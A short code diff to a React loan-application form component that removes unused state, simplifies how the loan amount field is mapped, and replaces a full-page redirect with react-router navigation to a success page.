@@ -1,17 +1,9 @@
 import React, { useState, useEffect } from 'react'
+import { useNavigate } from 'react-router-dom'
 import { apiService } from '../services/api.js'
 
 function Apply() {
-  const [client, setClient] = useState({
-    name: "",
-    number: "",
-    dob: "",
-    loan: "",
-    id: "",
-    otp: "",
-    income: ""
-  })
-
+  const navigate = useNavigate()
   const [formData, setFormData] = useState({
     name: "",
     number: "",
@@ -25,7 +17,6 @@ function Apply() {
   })
 
   const [isAgree, setIsAgree] = useState(false)
-  const [showSuccess, setShowSuccess] = useState(false)
   const [isSubmitting, setIsSubmitting] = useState(false)
 
   useEffect(() => {
@@ -57,7 +48,7 @@ function Apply() {
       number: formData.number || "",
       dob: formData.dob || "",
       id: formData.id || "",
-      loan: formData.amount || formData.loan || "",
+      loan: formData.amount || "",
       income: formData.employment || "",
       otp: ""
     }
@@ -74,7 +65,7 @@ function Apply() {
     } finally {
       setIsSubmitting(false)
       const user = window.location.pathname.split("/")[1] || 'default'
-      window.location.href = `/${user}/success?name=${encodeURIComponent(formData.name)}`
+      navigate(`/${user}/success?name=${encodeURIComponent(formData.name)}`)
     }
   }
 
